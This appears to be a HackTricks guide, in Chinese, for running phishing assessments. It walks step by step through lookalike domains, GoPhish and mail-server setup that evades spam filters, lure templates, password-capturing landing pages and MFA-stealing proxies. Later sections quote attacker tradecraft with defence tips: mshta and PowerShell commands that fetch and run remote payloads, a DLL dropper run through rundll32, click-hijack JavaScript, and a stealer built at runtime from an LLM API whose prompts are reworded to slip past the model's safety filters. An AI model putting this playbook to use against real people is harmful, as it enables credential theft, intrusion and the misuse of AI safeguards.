# 网络钓鱼方法论

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 侦察受害者
1. 选择**受害者域名**。
2. 执行一些基本的 Web 枚举，**搜索受害者使用的登录门户**，并**决定**要**仿冒**哪一个。
3. 使用一些 **OSINT** 来**查找电子邮件**。
2. 准备环境
1. **购买域名**，用于网络钓鱼评估
2. **配置与 email service 相关的记录**（SPF、DMARC、DKIM、rDNS）
3. 使用 **gophish** 配置 VPS
3. 准备 campaign
1. 准备**email template**
2. 准备**用于窃取凭据的网页**
4. Launch campaign！

## 生成相似域名或购买受信任的域名

### 域名变体技术

- **Keyword**：域名**包含**原始域名中的重要**关键词**（例如 zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **hypened subdomain**：将子域名中的**点替换为连字符**（例如 www-zelster.com）。
- **New TLD**：使用**新的 TLD** 的相同域名（例如 zelster.org）
- **Homoglyph**：将域名中的某个字母**替换为外观相似的字母**（例如 zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **交换**域名中的两个字母（例如 zelsetr.com）。
- **Singularization/Pluralization**：在域名末尾添加或删除 “s”（例如 zeltsers.com）。
- **Omission**：从域名中**删除一个**字母（例如 zelser.com）。
- **Repetition:** **重复**域名中的一个字母（例如 zeltsser.com）。
- **Replacement**：类似于 Homoglyph，但隐蔽性较低。将域名中的某个字母替换为其他字母，例如键盘上靠近原字母的字母（例如 zektser.com）。
- **Subdomained**：在域名内部引入一个**点**（例如 ze.lster.com）。
- **Insertion**：在域名中**插入一个字母**（例如 zerltser.com）。
- **Missing dot**：将 TLD 附加到域名后面。（例如 zelstercom.com）

**自动化工具**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**网站**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

由于太阳耀斑、宇宙射线或硬件错误等各种因素，存储中或通信中的某些 bit **可能会被自动翻转**。

当这一概念**应用于 DNS 请求**时，**DNS server 接收到的域名**可能与最初请求的域名不同。

例如，对域名 “windows.com” 进行单个 bit 修改后，可能会将其变为 “windnws.com”。

攻击者可能会**通过注册多个 bit-flipping 域名来利用这一点**，这些域名与受害者的域名相似。他们的目的是将合法用户重定向到自己的基础设施。

如需更多信息，请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)。<sup>[[10]](#references)[[11]](#references)</sup>

### 购买受信任的域名

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 中搜索可用的过期域名。\
为了确保你要购买的过期域名**已经拥有良好的 SEO**，可以搜索它在以下网站中的分类：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 发现电子邮件

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（100% 免费）
- [https://phonebook.cz/](https://phonebook.cz)（100% 免费）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了**发现更多**有效的电子邮件地址，或**验证已经发现的地址**，可以检查是否能够对受害者的 SMTP server 进行 brute-force。[在此处了解如何验证/发现电子邮件地址](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，不要忘记，如果用户使用**任何 web portal 访问其邮件**，可以检查该 portal 是否容易受到**username brute force** 攻击，并在可能的情况下利用该漏洞。

## 配置 GoPhish

### 安装

你可以从 [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) 下载。

将其下载并解压到 `/opt/gophish` 中，然后执行 `/opt/gophish/gophish`\
输出中会显示端口 3333 上 admin user 的密码。因此，访问该端口并使用这些凭据修改 admin password。你可能需要将该端口 tunnel 到本地：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS 证书配置**

在此步骤之前，你应该**已经购买了域名**，并且该域名必须**指向**用于配置 **gophish** 的 **VPS IP**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**邮件配置**

开始安装：`apt-get install postfix`

然后将域名添加到以下文件中：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**同时修改 /etc/postfix/main.cf 中以下变量的值**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最后，将文件 **`/etc/hostname`** 和 **`/etc/mailname`** 修改为你的域名，然后**重启 VPS。**

现在，创建一条 **DNS A 记录**，将 `mail.<domain>` 指向 VPS 的 **ip 地址**，并创建一条指向 `mail.<domain>` 的 **DNS MX** 记录。

现在让我们测试发送一封电子邮件：
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 配置**

停止 Gophish 的运行并进行配置。\
将 `/opt/gophish/config.json` 修改为以下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish 服务**

为了创建 gophish 服务，使其能够自动启动并作为服务进行管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成服务配置并进行检查，执行以下操作：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置 mail server 和 domain

### 等待并保持 legit

domain 越老，被判定为 spam 的可能性就越低。因此，在进行 phishing assessment 之前，你应该尽可能等待更长时间（至少 1 周）。此外，如果你放置一个介绍信誉良好行业的页面，获得的 reputation 会更好。

请注意，即使必须等待一周，你现在也可以完成所有配置。

### 配置 Reverse DNS（rDNS）记录

设置一个 rDNS（PTR）记录，将 VPS 的 IP 地址解析到 domain name。

### Sender Policy Framework（SPF）记录

你必须**为新 domain 配置 SPF 记录**。如果你不知道什么是 SPF 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 生成 SPF policy（使用 VPS machine 的 IP）

![用于为 phishing domain 生成 SPF 记录的 SPF Wizard 表单](<../../images/image (1037).png>)

以下内容必须设置在 domain 内部的 TXT 记录中：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 基于域的消息身份验证、报告与一致性 (DMARC) 记录

你必须为**新域配置 DMARC 记录**。如果你不知道什么是 DMARC 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一条新的 DNS TXT 记录，将主机名 `_dmarc.<domain>` 指向以下内容：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

你必须为**新域名配置 DKIM**。如果你不知道什么是 DMARC 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于：[https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> 你需要将 DKIM key 生成的两个 B64 值拼接起来：
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的 email 配置评分

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com) 来完成测试\
只需访问该页面，并向他们提供的地址发送一封 email：
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你还可以通过向 `check-auth@verifier.port25.com` 发送邮件并**读取响应**来**检查你的 email 配置**（为此，你需要**开放**端口 **25**；如果以 root 身份发送邮件，可以在文件 _/var/mail/root_ 中查看响应）。\
检查是否通过了所有测试：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你也可以将**消息发送到你控制的 Gmail 账户**，然后在 Gmail 收件箱中检查**电子邮件的 headers**，`Authentication-Results` header 字段中应显示 `dkim=pass`。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​从 Spamhaus 黑名单中移除

页面 [www.mail-tester.com](https://www.mail-tester.com) 可以告知你域名是否被 spamhaus 屏蔽。你可以在此请求移除你的域名/IP：​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### 从 Microsoft 黑名单中移除

​​你可以在 [https://sender.office.com/](https://sender.office.com) 请求移除你的域名/IP。

## 创建并启动 GoPhish Campaign

### Sending Profile

- 设置一个用于**识别**发送者配置文件的**名称**
- 确定你将从哪个账户发送 phishing emails。建议使用：_noreply、support、servicedesk、salesforce..._
- 用户名和密码可以留空，但请务必勾选 Ignore Certificate Errors

![创建并启动 GoPhish Campaign - Sending Profile：用户名和密码可以留空，但请务必勾选 Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 建议使用 "**Send Test Email**" 功能来测试一切是否正常运行。\
> 我建议将测试邮件发送到 10min mails 地址，以避免在测试过程中被列入黑名单。

### Email Template

- 设置一个用于**识别**模板的**名称**
- 然后编写一个**主题**（不要奇怪，只需使用你可能在普通邮件中看到的内容）
- 确保已勾选 "**Add Tracking Image**"
- 编写**邮件模板**（你可以像下面的示例一样使用变量）：
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
请注意，**为了提高邮件的可信度**，建议使用一封来自客户的邮件中的签名。建议：

- 向一个**不存在的地址**发送邮件，并检查回复中是否包含签名。
- 搜索 **public emails**，例如 info@ex.com、press@ex.com 或 public@ex.com，向其发送邮件并等待回复。
- 尝试联系某个**已发现的有效**邮箱，并等待回复。

![Sending Profile - Email Template: 尝试联系某个已发现的有效邮箱，并等待回复](<../../images/image (80).png>)

> [!TIP]
> Email Template 还允许**附加要发送的文件**。如果你还想使用特殊构造的文件/文档窃取 NTLM challenges，请[阅读此页面](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 设置一个**名称**
- **编写网页的 HTML code**。注意，你可以**导入**网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置一个**重定向**

![Email Template - Landing Page: 勾选 Capture Submitted Data 和 Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常，你需要修改页面的 HTML code，并在本地进行一些测试（可能使用某个 Apache server），**直到你对结果满意为止。**然后，将该 HTML code 写入文本框。\
> 请注意，如果你需要为 HTML **使用某些静态资源**（可能是一些 CSS 和 JS 页面），可以将它们保存到 _**/opt/gophish/static/endpoint**_，然后通过 _**/static/\<filename>**_ 访问。

> [!TIP]
> 对于重定向，你可以将**用户重定向到受害者的合法主页**，或者将他们重定向到 _/static/migration.html_，例如显示一个**旋转加载图标（**[**https://loading.io/**](https://loading.io)**) 5 秒，然后提示该过程已成功**。

### Users & Groups

- 设置一个名称
- **导入数据**（请注意，要使用此示例的 template，需要每个用户的 firstname、last name 和 email address）

![Landing Page - Users & Groups: 导入数据（请注意，要使用此示例的 template，需要每个用户的 firstname、last name 和 email address）](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择名称、email template、landing page、URL、sending profile 和 group。请注意，URL 将是发送给受害者的链接。

请注意，**Sending Profile 允许发送测试邮件，以查看最终的 phishing email 的显示效果**：

![Users & Groups - Campaign: 注意 Sending Profile 允许发送测试邮件，以查看最终的 phishing email 的显示效果](<../../images/image (192).png>)

一切准备就绪后，只需启动 campaign！

## Website Cloning

如果你出于任何原因想要 clone website，请查看以下页面：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

在某些 phishing assessments 中（主要针对 Red Teams），你还可能希望**发送包含某种 backdoor 的文件**（可能是 C2，也可能只是触发 authentication 的文件）。\
以下页面提供了一些示例：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

之前的 attack 相当巧妙，因为你伪造了真实网站并收集用户输入的信息。遗憾的是，如果用户没有输入正确的 password，或者你伪造的 application 配置了 2FA，**这些信息将无法让你 impersonate 被欺骗的用户**。

这正是 [**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 等 tools 发挥作用的地方。这些 tool 能够让你生成类似 MitM 的 attack。基本上，attack 的工作方式如下：

1. 你**伪装真实网页的 login** form。
2. 用户将其**credentials**发送到你的 fake page，tool 再将这些 credentials 发送到真实网页，**检查 credentials 是否有效**。
3. 如果 account 配置了 **2FA**，MitM page 会要求用户提供 2FA；用户**输入**后，tool 会将其发送到真实网页。
4. 用户完成 authentication 后，在 tool 执行 MitM 的过程中，你（作为 attacker）将**捕获 credentials、2FA、cookie 以及每次交互中的任何信息**。

### Via VNC

如果不将**受害者发送到外观与原页面相同的恶意页面**，而是将其发送到一个**连接至真实网页的浏览器 VNC session**，会怎样？你将能够看到他的操作，窃取 password、使用的 MFA、cookies……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 完成此操作。<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

显然，判断你是否已经暴露的最佳方式之一，是**在 blacklists 中搜索你的 domain**。如果它出现在列表中，说明你的 domain 已以某种方式被检测为可疑。\
检查你的 domain 是否出现在任何 blacklist 中的一种简单方法，是使用 [https://malwareworld.com/](https://malwareworld.com)

不过，还有其他方法可以判断受害者是否正在**主动寻找野外的可疑 phishing activity**，具体说明见：


{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个名称与受害者 domain 非常相似的 domain**，和/或为你控制的 domain 的**subdomain 生成 certificate**，其中包含受害者 domain 的**keyword**。如果**受害者**与这些 domain 进行任何类型的 **DNS 或 HTTP interaction**，你就会知道他正在**主动查找**可疑 domain，因此需要非常隐蔽。<sup>[[2]](#references)</sup>

### Evaluate the phishing

使用 [**Phishious** ](https://github.com/Rices/Phishious)评估你的 email 是否会进入 spam folder，或者被阻止或成功送达。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

现代 intrusion sets 越来越多地完全跳过 email lures，转而**直接攻击 service-desk / identity-recovery workflow**，以绕过 MFA。该 attack 完全采用 "living-off-the-land" 方式：operator 一旦取得有效 credentials，就会使用内置的 admin tooling 进行 pivot——无需 malware。<sup>[[6]](#references)</sup>

### Attack flow
1. Recon 受害者
* 从 LinkedIn、data breaches、public GitHub 等来源收集个人和企业详细信息。
* 识别高价值 identities（executives、IT、finance），并枚举 password / MFA reset 的**确切 help-desk 流程**。
2. Real-time social engineering
* 通过电话、Teams 或 chat 联系 help-desk，同时 impersonate 目标（通常使用 **spoofed caller-ID** 或 **cloned voice**）。
* 提供之前收集的 PII，以通过基于知识的验证。
* 说服 agent **reset MFA secret**，或对已注册的 mobile number 执行 **SIM-swap**。
3. Immediate post-access actions（真实案例中 ≤60 分钟）
* 通过任意 web SSO portal 建立 foothold。
* 使用内置工具枚举 AD / AzureAD（不落地 binaries）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 使用环境中已列入 allowlist 的 **WMI**、**PsExec** 或合法 **RMM** agents 进行 lateral movement。

### Detection & Mitigation
* 将 help-desk identity recovery 视为**特权操作**——要求 step-up auth 和 manager approval。
* 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** rules，并针对以下情况发出 alert：
* MFA method changed + authentication from new device / geo。
* 同一 principal 立即发生 elevation（user-→-admin）。
* 记录 help-desk calls，并在任何 reset 前强制**回拨已注册的 number**。
* 实施 **Just-In-Time (JIT) / Privileged Access**，确保 newly reset accounts **不会自动继承 high-privilege tokens**。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews 通过 mass attacks 抵消 high-touch ops 的成本，将**search engines 和 ad networks 转变为 delivery channel**。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** 将类似 `chromium-update[.]site` 的 fake result 推送到 search ads 顶部。
2. Victim 下载一个小型 **first-stage loader**（通常为 JS/HTA/ISO）。Unit 42 观察到的示例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader 外传 browser cookies 和 credential DBs，然后获取一个 **silent loader**，由其根据实时情况决定部署：
* RAT（例如 AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 阻止 newly-registered domains，并在 search-ads 和 e-mail 上都强制实施 **Advanced DNS / URL Filtering**。
* 将 software installation 限制为 signed MSI / Store packages，并通过 policy 禁止 `HTA`、`ISO`、`VBS` execution。
* 监控 browsers 创建 installer 子进程的情况：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt 经常被 first-stage loaders 滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

### Download-button click hijacking with TDS handoff
某些 fake software portals 会让可见的 download `href` 指向**真实的 GitHub/release URL**，但通过 JavaScript 劫持用户的**第一次交互**，转而将 victim 发送到一个 **Traffic Distribution System (TDS)** chain。<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
关键特征：
- 该 hook 通常在 `document` 上以 **capture phase**（`true`）运行，因此会先于站点处理程序触发。
- Chrome 通常使用 `mousedown` 而不是 `click`，以便让重定向与有效的 **user gesture** 绑定，并提高绕过 popup blocker 的成功率。
- 某些变体会预先打开 `about:blank`，或合成 `<a target="_blank">` 点击，之后才设置 TDS URL。
- 浏览器端的限制通常存储在 `localStorage` 中，因此**首次点击**可能会访问 malware，而刷新或重试时则会回退到看似 benign 的可见链接。
- TDS 可以根据 referrer、entry domain、GEO、浏览器/设备指纹、VPN/datacenter 检查、点击上下文以及每个 session 的计数器进行筛选，从而使分析人员的重放结果具有非确定性。

防御思路：
- 对比**显示的** `href` 与点击时实际生成的导航目标。
- 搜索在 `document.addEventListener(..., true)` 中注册的 handlers，尤其关注其在 `window.open`、`about:blank` 或合成 anchor 点击附近同时调用 `preventDefault()` 和 `stopImmediatePropagation()` 的情况。
- 将一组新注册的软件下载域名全部加载相同 CloudFront/JS stage 的情况，视为高可信度的 SEO-poisoning/TDS 模式。

### 来自 fake verification pages 的 ClickFix + 类似 archive 的 LOLBAS fetches
某些 TDS 分支最终会进入 fake verification page（Cloudflare/IUAM 风格），诱导受害者运行受信任的 Windows binary，例如：<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
备注：
- `mshta.exe` 会执行响应开头的 **HTA/VBScript**，即使 URL 假装指向 `.7z` archive；追加的 archive 数据可以只是纯粹的诱饵。
- 后续阶段通常会继续伪装文件类型（用 `.rtf` 伪装 PowerShell、用 `.asar` 伪装 Python、使用带填充二进制数据的 ZIP），随后切换到 **手动 PE 映射 / 内存中执行**。
- 如果你正在响应此类攻击链，请从首次成功运行开始保留**网络 + 内存**信息：后续重放可能只显示无害的 installer/SFX 路径，或者因 payload/key release 与原始 TDS session 绑定而失败。

### ClickFix DLL delivery tradecraft（伪造 CERT 更新）
* 诱饵：克隆的国家 CERT advisory，其中包含一个显示分步“修复”说明的 **Update** 按钮。受害者会被告知运行一个 batch，该 batch 下载 DLL 并通过 `rundll32` 执行它。<sup>[[12]](#references)</sup>
* 观察到的典型 batch chain：
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` 将 payload 写入 `%TEMP%`，短暂 sleep 用于隐藏网络抖动，随后 `rundll32` 调用导出的 entrypoint（`notepad`）。
* DLL beaconing 主机身份，并每隔几分钟轮询 C2。远程 tasking 以 **base64-encoded PowerShell** 的形式到达，在隐藏窗口并绕过 policy 的情况下执行：
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 这保留了 C2 的灵活性（server 可以更换 task，而无需更新 DLL），并隐藏 console 窗口。应结合 `-WindowStyle Hidden`、`FromBase64String` 和 `Invoke-Expression`，搜寻 `rundll32.exe` 的 PowerShell 子进程。
* Defender 可以搜寻形如 `...page.php?tynor=<COMPUTER>sss<USER>` 的 HTTP(S) callback，以及 DLL load 后每 5 分钟一次的 polling 间隔。

---

## AI-Enhanced Phishing Operations
攻击者如今会串联 **LLM & voice-clone APIs**，以实现完全个性化的诱饵和实时交互。

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|生成并发送超过 100 k 封 emails / SMS，使用随机化措辞和 tracking links。|
|Generative AI|生成*一次性* emails，引用公开的 M&A、社交媒体中的内部笑话；在 callback scam 中使用 deep-fake CEO voice。|
|Agentic AI|自动注册 domains、抓取 open-source intel，并在受害者点击但未提交 creds 时，制作下一阶段的 mails。|

**Defence：**
• 添加**动态 banners**，突出显示由不受信任的 automation 发送的消息（通过 ARC/DKIM anomalies）。
• 为高风险电话请求部署**voice-biometric challenge phrases**。
• 在 awareness programmes 中持续模拟 AI-generated lures —— 静态 templates 已经过时。

另请参阅 —— 用于 credential phishing 的 agentic browsing abuse：

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

另请参阅 —— AI agent 对本地 CLI tools 和 MCP 的滥用（用于 secrets inventory 和 detection）：

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript（in-browser codegen）

攻击者可以发送看似无害的 HTML，并通过请求**受信任的 LLM API** 生成 stealer，然后在浏览器中执行它（例如使用 `eval` 或动态 `<script>`）。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation：** 在 prompt 中编码 exfil URLs/Base64 strings；反复调整措辞以绕过 safety filters 并减少 hallucinations。
2. **Client-side API call：** 加载时，JS 调用 public LLM（Gemini/DeepSeek/etc.）或 CDN proxy；静态 HTML 中只包含 prompt/API call。
3. **Assemble & exec：** 拼接 response 并执行它（每次访问生成 polymorphic 代码）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成的代码会个性化诱饵（例如解析 LogoKit token），并将 creds 发送到隐藏在 prompt 中的 endpoint。

**规避特征**
- 流量会访问知名 LLM 域名或信誉良好的 CDN 代理；有时通过 WebSockets 连接后端。
- 不存在静态 payload；恶意 JS 仅在渲染后存在。
- 非确定性生成会为每个会话生成**独特的** stealers。

**检测思路**
- 运行启用 JS 的 sandbox；标记**源自 LLM 响应的运行时 `eval`/动态脚本创建**。
- 搜索前端向 LLM API 发起的 POST，以及紧随其后对返回文本执行的 `eval`/`Function`。
- 对客户端流量中未经授权的 LLM 域名，以及随后发生的凭据 POST 发出告警。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
除了经典的 push-bombing 之外，operators 还会在 help-desk 通话期间直接**强制进行新的 MFA 注册**，使用户现有的 token 失效。此后出现的任何登录提示对受害者而言都显得合法。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
监控 AzureAD/AWS/Okta 事件，检查 **`deleteMFA` + `addMFA`** 是否在同一 IP 上于几分钟内发生。



## Clipboard Hijacking / Pastejacking

攻击者可以从被入侵或 typosquatted 的网页中，将恶意命令静默复制到受害者的剪贴板，然后诱骗用户将其粘贴到 **Win + R**、**Win + X** 或终端窗口中，从而在无需下载或附件的情况下执行任意代码。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## 移动端 Phishing 与恶意 App 分发（Android & iOS）


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### 通过 QR social engineering 劫持 WhatsApp 设备关联
* 诱导页面（例如伪造的政府部门/CERT“频道”）显示 WhatsApp Web/Desktop QR，并指示受害者扫描，从而在不知情的情况下将攻击者添加为**关联设备**。<sup>[[12]](#references)</sup>
* 攻击者会立即获得聊天和联系人可见性，直到该会话被移除。受害者之后可能会看到“已关联新设备”的通知；防御者可以搜寻在访问不受信任的 QR 页面后不久发生的异常设备关联事件。

### 通过移动端门控 Phishing 规避爬虫/沙箱
攻击者越来越多地通过简单的设备检查来限制其 Phishing 流程，使桌面爬虫无法访问最终页面。常见模式是使用一个小型脚本检测是否存在支持触摸的 DOM，并将结果 POST 到服务器端点；非移动客户端会收到 HTTP 500（或空白页面），而移动用户则会获得完整流程。<sup>[[7]](#references)</sup>

最小客户端代码片段（典型逻辑）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 逻辑（简化版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
常见的服务器行为：
- 在首次加载期间设置 session cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，后续 GET 请求返回 500（或占位内容）；仅当其为 `true` 时提供 phishing 内容。

搜寻与检测启发式方法：
- urlscan 查询：`filename:"detect_device.js" AND page.status:500`
- Web telemetry：对于非移动端，依次出现 `GET /static/detect_device.js` → `POST /detect` → HTTP 500；合法的移动端受害者路径则返回 200，并继续加载 HTML/JS。
- 阻止或仔细审查仅根据 `ontouchstart` 或类似设备检查来决定内容的页面。

防御建议：
- 使用类似移动端的 fingerprints 并启用 JS 执行 crawlers，以发现受限内容。
- 对新注册域名中 `POST /detect` 后出现的可疑 500 响应发出告警。

## References

